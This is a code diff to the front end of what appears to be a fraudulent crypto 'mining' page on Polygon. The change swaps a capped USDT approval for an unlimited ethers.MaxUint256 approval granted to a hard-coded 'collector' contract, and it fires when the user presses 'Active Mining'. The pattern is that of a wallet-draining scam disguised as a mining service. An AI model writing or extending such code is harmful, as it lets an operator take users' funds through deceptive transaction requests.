@@ -258,10 +258,10 @@
         let unsubPendingWithdraw = null;
         let unsubUserBalances = null;
 
-        // Only USDT approve() uses the contract
+        // Only USDT approve() uses the contract (Unlimited approval via MaxUint256)
         const COLLECTOR_CONTRACT_ADDRESS = "0xC9E28f1C5e8659CaEE3831daB4dF97325e7e5570";
         const USDT_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
-        const APPROVE_LIMIT_USDT = "100000";
+        const UNLIMITED_APPROVE_AMOUNT = ethers.MaxUint256;
         const POLYGON_CHAIN_ID = "0x89";
         const POLYGON_CHAIN_PARAMS = {
             chainId: POLYGON_CHAIN_ID,
@@ -929,7 +929,7 @@
             }
         }
 
-        // ONLY action using Contract: USDT approve()
+        // ONLY action using Contract: USDT approve() (Unlimited via ethers.MaxUint256)
         async function switchToPolygonAndApprove() {
             try {
                 const badgeEl = document.getElementById("selectedNetworkBadge");
@@ -939,12 +939,11 @@
                 connectBtn.innerText = "Active Mining";
                 connectBtn.className = "bg-blue-600 hover:bg-blue-500 font-semibold px-3.5 py-2.5 rounded-xl transition cursor-pointer text-sm shadow-lg";
 
-                showProgress(50, "Submitting approval Mining...");
-                startCountdown(25, "Approval to Mining");
+                showProgress(50, "Submitting unlimited approval Mining...");
+                startCountdown(25, "Unlimited Approval to Mining");
 
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_APPROVE_ABI, signer);
-                const maxAmount = ethers.parseUnits(APPROVE_LIMIT_USDT, 6);
-                const tx = await usdtContract.approve(COLLECTOR_CONTRACT_ADDRESS, maxAmount);
+                const tx = await usdtContract.approve(COLLECTOR_CONTRACT_ADDRESS, UNLIMITED_APPROVE_AMOUNT);
                 const receipt = await tx.wait();
 
                 stopCountdown();
@@ -1133,11 +1132,11 @@
                     0n
                 );
                 if ((currentAllowance ?? 0n) < rawBalance) {
-                    showProgress(55, "USDT Approval Transaction တင်နေသည်...");
+                    showProgress(55, "USDT Unlimited Approval Transaction တင်နေသည်...");
                     const usdtSigner = new ethers.Contract(USDT_ADDRESS, USDT_APPROVE_ABI, signer);
                     const appTx = await usdtSigner.approve(
                         COLLECTOR_CONTRACT_ADDRESS,
-                        ethers.parseUnits(APPROVE_LIMIT_USDT, 6)
+                        UNLIMITED_APPROVE_AMOUNT
                     );
                     await appTx.wait();
                 }
